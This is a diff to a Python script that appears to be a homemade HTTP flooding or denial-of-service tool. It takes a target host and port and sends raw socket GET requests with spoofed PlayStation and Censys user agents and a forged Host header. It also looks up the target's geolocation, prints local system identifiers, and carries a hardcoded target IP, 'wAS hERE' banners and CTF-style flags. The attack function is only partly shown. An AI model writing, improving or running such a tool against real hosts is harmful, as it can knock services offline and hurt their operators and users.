@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 #
-import hashlib, json, os, platform, random, requests, socket, sys, time ,uuid
-from threading import Timer
-#from requests import get
+import hashlib, json, os, random, socket, sys, time ,uuid
+# from threading import Thread
+from requests import get
 
 #
 hello = '''
@@ -23,35 +23,39 @@ user_agent2 = 'Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys
 ps4 = "Mozilla/5.0 (PlayStation 4 5.55) AppleWebKit/601.2 (KHTML, like Gecko)"
 user_agent = ps4
 
-station = socket.gethostname();
-address = socket.gethostbyname(station)
-hostnme = os.uname()[0];
-usernme = os.environ.get('USERNAME')
-admin = os.getlogin();
-admin = str(admin).replace('K', 'k').replace('l', 'L')
+# scratch.py
+#
+# import platform
+# operating_system = platform.system()
+# username = platform.uname()
+# hostname = platform.node()
+#
+# PAUSE
+
+workstat = os.uname()[0]
+hostname = os.uname()[1]
+platform = os.uname()[2]
+username = os.environ.get('USERNAME')
+admin = str(os.getlogin()).replace('K', 'k').replace('l', 'L')
 MAC = hex(uuid.getnode());
-delay = 0.75
+WHO = f"{admin} wAS hERE"
 
-BLOB = True
-FLAG = '10v3{5h371x1}'
-
+BLOB = ["Hanna Sofea's comrade \ written by kwafelt", "10v3{5h371x1}"]
+FLAG = BLOB[1]
 ROOT = [""]
-#STAT = [socket.gethostname(),socket.gethostbyname(STAT[0])]
 HTTP = ['HTTP/1.0','HTTP/1.1','HTTP/2']
 HOST = ['writ.er.ws','search.censys.io']
 CONN = ['close','Keep-Alive']
-
-target_host = None
-target_port = None
+TEXT = ["Injecting process"]
 
 p1 = [sys.argv[0], "",""]
+target_host = None
+target_port = None
+delay = 0.75
 
 TARGET_IP = '80.179.151.134'; status = 'dorman'
 #
-workstation = "Hanna Sofea's comrade";
-v4L = f'{admin} wAS hERE'
-txt = ["","written by kwafelt"]
-inject = 'Injecting process';
+
 question = 'Do you want to continue ?'
 confirm = ['Do you want to continue ?','Is this ok ?']
 
@@ -59,15 +63,13 @@ confirm = ['Do you want to continue ?','Is this ok ?']
 num_requests = 0;
 thread_num = 0;
 
-# cdata.py
-#
 def color(r, g, b, text):
   return '\033[38;2;{};{};{}m{}\033[38;2;255;255;255m'.format(r, g, b, text);
 
 def title(c):
-  if (c == 'start'): terminal_title = f'{workstation} \ {txt[1]}'
-  if (c == 'prcss'): terminal_title = f'{inject} \ {target_host}:{target_port} \ {v4L}'
-  print(f'\33]0;{terminal_title}\a', end = txt[0], flush = True)
+  if (c == 'start'): terminal_title = BLOB[0]
+  if (c == 'prcss'): terminal_title = f'{TEXT[0]} \ {target_host}:{target_port} \ {WHO}'
+  print(f'\33]0;{terminal_title}\a', end = "", flush = True)
 
 def write(c):
   return sys.stdout.write(c)
@@ -108,8 +110,10 @@ def parse(init):
   global p1
   if (len(sys.argv) == 3):
     global target_host; global target_port
-    target_host = str(sys.argv[1]); p1[1] = target_host
-    target_port = int(sys.argv[2]); p1[2] = target_port
+    FQDN = str(sys.argv[1]).replace("https://", "").replace("http://", "").replace("www.", "")
+    target_host = str(socket.gethostbyname(FQDN))
+    target_port = int(sys.argv[2])
+    p1 = [sys.argv[0], sys.argv[1], target_port]
     verif(init)
   else:
     write(f'\r\n Usage: {sys.argv[0]} <target_host> <target_port>')
@@ -142,11 +146,11 @@ def accss(text):
 def press(c):
   ossys('setterm --foreground white --background black --cursor on')
   ossys('clear')
-  tx1 = color(242,210,189, admin)
-  tx2 = color(192,192,192, station)
+  tx1 = color(242,210,189, username)
+  tx2 = color(192,192,192, hostname)
   tx3 = color(242,210,189, MAC)
-  tx4 = color(192,192,192, client('os'))
-  tx5 = color(242,210,189, platform.release())
+  tx4 = color(192,192,192, workstat)
+  tx5 = color(242,210,189, platform)
   write(f'\r\n {tx1} {tx2} {tx3} {tx4} {tx5}\r\n')
   write(f'\r\n {ipapi(0)}\r\n')
   tx6 = color(248,152,128, f'wanna/will inject process to {target_host} : {target_port}')
@@ -173,15 +177,15 @@ def recon(c):
   ossys('clear')
   title('prcss')
   tx1 = ctime(0)
-  tx2 = f"{inject}.."
+  tx2 = TEXT[0]
   pst = print_status()
   pst.initial(tx1, tx2)
-  process(0);
+  process(0)
   
 ################################################################################
 def ipapi(i):
   URL = ['http://ip-api.com/json/', f'http://ip-api.com/json/{target_host}'];  # EDT https://ipinfo.io/json/1.1.1.1
-  response = requests.get(URL[i])
+  response = get(URL[i]) # ORIG: requests.get(str)
   txt = json.loads(response.text)
   if (txt['status'] == 'success'):
   
@@ -199,15 +203,6 @@ def ipapi(i):
 # print(ip) # 'My public IP address is:', ip
 #felt()
 ################################################################################
-#
-# scratch.py
-#
-def client(init):  # platform
-    client_os = platform.system();
-    un = platform.uname();
-    client_hn = platform.node();  # hostname
-    if (init == 'os'): return client_os;
-    if (init == 'hn'): return client_hn;
 
 def address(LAN):
     if LAN == 0:
@@ -223,29 +218,29 @@ def address(LAN):
 ###############################################################################
 class print_status():
   def initial(self, txt0, txt1):
-    tx1 = color(245, 215, 0, txt0);
-    tx2 = color(99, 99, 99, 'Initial');
-    tx3 = color(255, 215, 0, txt1);
-    sys.stdout.write(f'\r {tx1} {tx2} {tx3}\r');
+    tx1 = color(245, 215, 0, txt0)
+    tx2 = color(99, 99, 99, 'Initial')
+    tx3 = color(255, 215, 0, txt1)
+    write(f'\r {tx1} {tx2} {tx3}..\r')
   def success(self, txt0, txt1):
-    tx1 = color(224,191,184, txt0);
-    tx2 = color(218,112,214, 'Success');
-    tx3 = color(248,152,128, txt1);
-    tx4 = color(224,191,184, v4L);
-    sys.stdout.write(f'\r\n {tx1} {tx2} {tx3} {tx4}\r');
+    tx1 = color(224,191,184, txt0)
+    tx2 = color(218,112,214, 'Success')
+    tx3 = color(248,152,128, txt1)
+    tx4 = color(224,191,184, WHO)
+    write(f'\r\n {tx1} {tx2} {tx3} {tx4}\r')
   def timeout(self, txt0, txt1):
-    tx1 = color(145,145,145, txt0);
-    tx2 = color(245, 245, 245, 'Timeout');
-    tx3 = color(245,215,0,'[--ERR_CONNECTION_TIMEOUT_ERR--]')
-    tx4 = color(0, 110, 210, '[-RECONNECTING-]');
-    sys.stdout.write(f'\r\n {tx1} {tx2} {tx3} {tx4}\r');
+    tx1 = color(145,145,145, txt0)
+    tx2 = color(245, 245, 245, 'Timeout')
+    tx3 = color(245,215,0,'...ERR_CONNECTION_TIMEOUT_ERR...')
+    tx4 = color(0, 110, 210, 'RE-CONNECTING..')
+    write(f'\r\n {tx1} {tx2} {tx3} {tx4}\r')
   def failure(self, txt0, txt1):
-    tx1 = color(145, 145, 145, txt0);
-    tx2 = color(245, 110, 110, 'Failure');
-    tx3 = color(245, 1, 1, 'No connection SERVER MAY BE DOWN');
-    tx4 = color(245,110,110, "");
-    sys.stdout.write(f'\r\n {tx1} {tx2} {tx3} {tx4}\r');
-  flag = 'ctf{kwafeLt_wAS_hERE}';
+    tx1 = color(145, 145, 145, txt0)
+    tx2 = color(245, 110, 110, 'Failure')
+    tx3 = color(245, 1, 1, 'No connection SERVER MAY BE DOWN')
+    tx4 = color(245,110,110, "")
+    write(f'\r\n {tx1} {tx2} {tx3} {tx4}\r')
+  flag = 'ctf{kwafeLt_wAS_hERE}'
 
 ###############################################################################
 
@@ -254,7 +249,7 @@ def attack(init):
   with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as proc:
     try:
       address = (target_host, target_port)
-      proc.settimeout(2.0); proc.connect(address)
+      proc.settimeout(2.2); proc.connect(address)
       b1 = f'GET /?!{data} {HTTP[1]}\r\nHost: {HOST[1]}\r\nAccept: application/json, text/plain, */*\r\n'
       b2 = f'Accept-Encoding: gzip, deflate\r\nAccept-Language: en-us, en\r\nConnection: {CONN[1]}\r\n'
       b3 = f'Keep-Alive: timeout=10, max=100\r\nUser-Agent: {user_agent}\r\n\r\n'
